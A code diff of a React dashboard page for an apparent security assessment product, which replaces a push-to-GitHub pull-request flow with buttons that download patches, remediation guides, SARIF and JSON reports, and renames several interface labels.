-                          onChange={e => setGithubRepoUrl(e.target.value)}
-                        />
-                      </div>
-                      <div className={styles.subInputWrap}>
-                        <label className={styles.subLabel}>Base Branch</label>
-                        <input
-                          type="text"
-                          className={styles.subInput}
-                          placeholder="main"
-                          value={githubTargetBranch}
-                          onChange={e => setGithubTargetBranch(e.target.value)}
-                        />
-                      </div>
-                    </div>
-                  </div>
                 </div>
 
                 <div className={styles.optionCard} style={{ width: '100%' }}>
                   <div className={styles.optionHeader}>
-                    <span className={styles.optionLabel}>Custom Agent Directives (Optional)</span>
-                    <span className={styles.inputHint}>Tailor attack scope or credentials</span>
+                    <span className={styles.optionLabel}>Custom Engagement Instructions (Optional)</span>
+                    <span className={styles.inputHint}>Specify scope boundaries or authentication parameters</span>
                   </div>
                   <textarea
                     className={styles.instructionField}
-                    placeholder={'Focus on OAuth tokens and BOLA parameter tampering on /api/v2 endpoints.\nSimulate standard role vs admin escalation.'}
+                    placeholder={'Focus on authorization flows on /api/v2 and token privilege escalation.\nExclude /admin/delete-database testing.'}
                     value={instructions}
                     onChange={e => setInstructions(e.target.value)}
-                    rows={4}
+                    rows={3}
                   />
                 </div>
 
                 <div className={styles.scanActions}>
                   <div className={styles.costEstimate}>
-                    <span>Target Type:</span>
+                    <span>Target Scope:</span>
                     <span className={styles.costAmount}>{scanType.toUpperCase()}</span>
-                    <span className={styles.costNote}>— Auto-fix PRs target {githubRepoUrl.replace('https://github.com/', '')}</span>
+                    <span className={styles.costNote}>— Generates downloadable step-by-step guides &amp; patches</span>
                   </div>
                   <button
                     className="btn-primary"
@@ -657,7 +689,7 @@ export default function DashboardPage() {
                     disabled={scanProgress.status === 'running'}
                     style={{ padding: '14px 32px', fontSize: '0.95rem' }}
                   >
-                    {scanProgress.status === 'running' ? 'Scan In Progress...' : 'Launch Strix Managed Scan'}
+                    {scanProgress.status === 'running' ? 'Assessment In Progress...' : 'Launch Managed Assessment'}
                   </button>
                 </div>
               </div>
@@ -670,7 +702,7 @@ export default function DashboardPage() {
               <div className={styles.findingsHeader}>
                 <div className={styles.findingsMeta}>
                   <span className={styles.findingsTarget}>{selectedScan.target}</span>
-                  <span className={styles.findingsDate}>{selectedScan.date} · Strix AI Managed Pentest</span>
+                  <span className={styles.findingsDate}>{selectedScan.date} · Managed AI Assessment</span>
                 </div>
                 <div className={styles.findingsBadges}>
                   <span className="badge badge-red">{selectedScan.critical} Critical</span>
@@ -694,20 +726,14 @@ export default function DashboardPage() {
                       className={`${styles.vulnCard} ${selectedVuln?.id === v.id ? styles.vulnCardSelected : ''}`}
                       onClick={() => setSelectedVuln(v)}
                     >
-                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-                        <div className={`badge ${severityBadge(v.severity)}`} style={{ fontSize: '0.7rem' }}>
-                          {v.severity.toUpperCase()}
-                        </div>
-                        {prStatuses[v.id]?.status === 'created' && (
-                          <span className={styles.prBadge}>PR #{prStatuses[v.id]?.prNumber}</span>
-                        )}
+                      <div className={`badge ${severityBadge(v.severity)}`} style={{ fontSize: '0.7rem' }}>
+                        {v.severity.toUpperCase()}
                       </div>
                       <div className={styles.vulnTitle}>{v.title}</div>
                       <div className={styles.vulnMeta}>
                         <span className={styles.vulnEndpoint}>{v.endpoint}</span>
                         <span className={styles.cvssScore}>CVSS {v.cvss}</span>
                       </div>
-                      {v.status === 'fixed' && <span className="badge badge-green" style={{ fontSize: '0.65rem', marginTop: '4px' }}>Remediated</span>}
                     </div>
                   ))}
                 </div>
@@ -715,18 +741,8 @@ export default function DashboardPage() {
                 {selectedVuln ? (
                   <div className={styles.vulnDetail}>
                     <div className={styles.vulnDetailHeader}>
-                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-                        <div className="badge badge-red" style={{ fontSize: '0.75rem' }}>{selectedVuln.severity.toUpperCase()} · CVSS {selectedVuln.cvss}</div>
-                        {prStatuses[selectedVuln.id]?.status === 'created' && (
-                          <a
-                            href={prStatuses[selectedVuln.id]?.prUrl}
-                            target="_blank"
-                            rel="noopener noreferrer"
-                            className={styles.prLinkBadge}
-                          >
-                            GitHub PR #{prStatuses[selectedVuln.id]?.prNumber} Opened ↗
-                          </a>
-                        )}
+                      <div className="badge badge-red" style={{ fontSize: '0.75rem' }}>
+                        {selectedVuln.severity.toUpperCase()} · CVSS {selectedVuln.cvss}
                       </div>
                       <h2 className={styles.vulnDetailTitle}>{selectedVuln.title}</h2>
                       <div className={styles.vulnDetailMeta}>
@@ -735,26 +751,62 @@ export default function DashboardPage() {
                       </div>
                     </div>
 
-                    {prStatuses[selectedVuln.id]?.status === 'created' && (
-                      <div className={styles.prSuccessBanner}>
-                        <div className={styles.prSuccessHeader}>
-                          <span className={styles.prCheckIcon}>✓</span>
-                          <strong>Remediation Pull Request Successfully Pushed to GitHub!</strong>
-                        </div>
-                        <p className={styles.prSuccessText}>
-                          Branch <code>{prStatuses[selectedVuln.id]?.branch}</code> was pushed to <code>{githubRepoUrl}</code>.
-                        </p>
-                        <a
-                          href={prStatuses[selectedVuln.id]?.prUrl}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="btn-secondary"
-                          style={{ fontSize: '0.82rem', padding: '6px 14px', width: 'fit-content' }}
-                        >
-                          Review &amp; Merge PR on GitHub ↗
-                        </a>
+                    {/* DOWNLOADABLE REMEDIATION PACKAGE BAR */}
+                    <div className={styles.downloadPackageBar}>
+                      <div className={styles.downloadBarTitle}>
+                        <strong>Downloadable Remediation Package</strong>
+                        <span>Export verified fixes in your preferred format</span>
                       </div>
-                    )}
+                      <div className={styles.downloadButtonsGroup}>
+                        <button
+                          className={styles.downloadBtn}
+                          onClick={() => downloadFile(`${selectedVuln.id}-code-fix.patch`, selectedVuln.patch, 'text/plain')}
+                        >
+                          📥 Code Patch (.patch)
+                        </button>
+                        <button
+                          className={styles.downloadBtn}
+                          onClick={() => downloadFile(
+                            `${selectedVuln.id}-remediation-guide.md`,
+                            `# Remediation Guide: ${selectedVuln.title}\n\n## Vulnerability Details\n- Severity: ${selectedVuln.severity.toUpperCase()} (CVSS ${selectedVuln.cvss})\n- Type: ${selectedVuln.type}\n- Endpoint: ${selectedVuln.endpoint}\n\n## Description\n${selectedVuln.description}\n\n## Verified Proof of Concept\n\`\`\`\n${selectedVuln.poc}\n\`\`\`\n\n## Step-by-Step Fix Procedure\n${selectedVuln.fix}\n\n## Surgical Code Patch\n\`\`\`diff\n${selectedVuln.patch}\n\`\`\`\n`,
+                            'text/markdown'
+                          )}
+                        >
+                          📄 Developer Guide (.md)
+                        </button>
+                        <button
+                          className={styles.downloadBtn}
+                          onClick={() => downloadFile(
+                            `redsuture-${selectedVuln.id}.sarif`,
+                            JSON.stringify({
+                              version: '2.1.0',
+                              $schema: 'http://json.schemastore.org/sarif-2.1.0',
+                              runs: [{
+                                tool: { driver: { name: 'RedSuture Autonomous AI', version: '2.0.0' } },
+                                results: [{
+                                  ruleId: selectedVuln.id,
+                                  message: { text: selectedVuln.title },
+                                  properties: { cvss: selectedVuln.cvss, severity: selectedVuln.severity, remediation: selectedVuln.fix }
+                                }]
+                              }]
+                            }, null, 2),
+                            'application/json'
+                          )}
+                        >
+                          🛡️ SARIF v2.1.0 (.sarif)
+                        </button>
+                        <button
+                          className={styles.downloadBtn}
+                          onClick={() => downloadFile(
+                            `audit-report-${selectedVuln.id}.json`,
+                            JSON.stringify(selectedVuln, null, 2),
+                            'application/json'
+                          )}
+                        >
+                          📊 Audit Report (.json)
+                        </button>
+                      </div>
+                    </div>
 
                     <div className={styles.vulnSection}>
                       <h3 className={styles.vulnSectionTitle}>Verified Proof-of-Concept Exploit</h3>
@@ -764,43 +816,48 @@ export default function DashboardPage() {
                     </div>
 
                     <div className={styles.vulnSection}>
-                      <h3 className={styles.vulnSectionTitle}>Technical Impact &amp; Findings Description</h3>
-                      <p className={styles.vulnDesc}>
-                        The autonomous Strix pentest agent confirmed this exploit vector by actively bypassing validation on <code className={styles.code}>{selectedVuln.endpoint}</code> in an isolated runtime sandbox. No false positives—finding is fully reproducible.
-                      </p>
+                      <h3 className={styles.vulnSectionTitle}>Technical Impact &amp; Root Cause Analysis</h3>
+                      <p className={styles.vulnDesc}>{selectedVuln.description}</p>
                     </div>
 
                     <div className={styles.vulnSection}>
-                      <h3 className={styles.vulnSectionTitle}>SutureEngine Generated Code Patch</h3>
+                      <h3 className={styles.vulnSectionTitle}>Step-by-Step Implementation Guide</h3>
+                      <div className={styles.stepFixBox}>
+                        {selectedVuln.fix.split('\n').map((step, idx) => (
+                          <div key={idx} className={styles.stepFixItem}>
+                            <span>{step}</span>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+
+                    <div className={styles.vulnSection}>
+                      <h3 className={styles.vulnSectionTitle}>SutureEngine Surgical Code Patch</h3>
                       <div className={styles.patchDiffBox}>
-                        <pre className={styles.patchPre}>
-                          {generatedPatches[selectedVuln.id] || `// SutureEngine auto-fix for ${selectedVuln.title}\n// Enforce strict authorization checks & parameterized query`}
-                        </pre>
+                        <pre className={styles.patchPre}>{selectedVuln.patch}</pre>
                       </div>
                     </div>
 
                     <div className={styles.vulnActions}>
                       <button
                         className="btn-primary"
-                        onClick={() => handlePushToGithub(selectedVuln)}
-                        disabled={prStatuses[selectedVuln.id]?.status === 'pushing'}
+                        onClick={() => {
+                          navigator.clipboard?.writeText(selectedVuln.patch);
+                          showToast('Code patch copied to clipboard!');
+                        }}
                         style={{ fontSize: '0.875rem' }}
                       >
-                        {prStatuses[selectedVuln.id]?.status === 'pushing'
-                          ? 'Pushing Branch to GitHub...'
-                          : prStatuses[selectedVuln.id]?.status === 'created'
-                          ? 'Push Updated PR to GitHub'
-                          : 'Push Fix to GitHub (Create PR)'}
+                        Copy Code Patch
                       </button>
                       <button
                         className="btn-secondary"
                         onClick={() => {
-                          navigator.clipboard?.writeText(generatedPatches[selectedVuln.id] || '');
-                          alert('Patch diff copied to clipboard!');
+                          navigator.clipboard?.writeText(`${selectedVuln.title}\n\nDescription:\n${selectedVuln.description}\n\nRemediation Steps:\n${selectedVuln.fix}`);
+                          showToast('Remediation guide copied!');
                         }}
                         style={{ fontSize: '0.875rem' }}
                       >
-                        Copy Patch Diff
+                        Copy Implementation Guide
                       </button>
                     </div>
                   </div>
@@ -818,13 +875,13 @@ export default function DashboardPage() {
             <div className={styles.history}>
               <div className={styles.historyTable}>
                 <div className={styles.tableHeader}>
-                  <span>Target</span>
-                  <span>Date</span>
+                  <span>Target Asset</span>
+                  <span>Assessment Date</span>
                   <span>Duration</span>
                   <span>Critical</span>
                   <span>High</span>
                   <span>Score</span>
-                  <span></span>
+                  <span>Action</span>
                 </div>
                 {MOCK_SCANS.map(scan => (
                   <div key={scan.id} className={styles.tableRow}>
@@ -839,7 +896,7 @@ export default function DashboardPage() {
                       style={{ fontSize: '0.8rem', padding: '6px 12px' }}
                       onClick={() => { setSelectedScan(scan); setActiveTab('findings'); }}
                     >
-                      View →
+                      View Package →
                     </button>
                   </div>
                 ))}
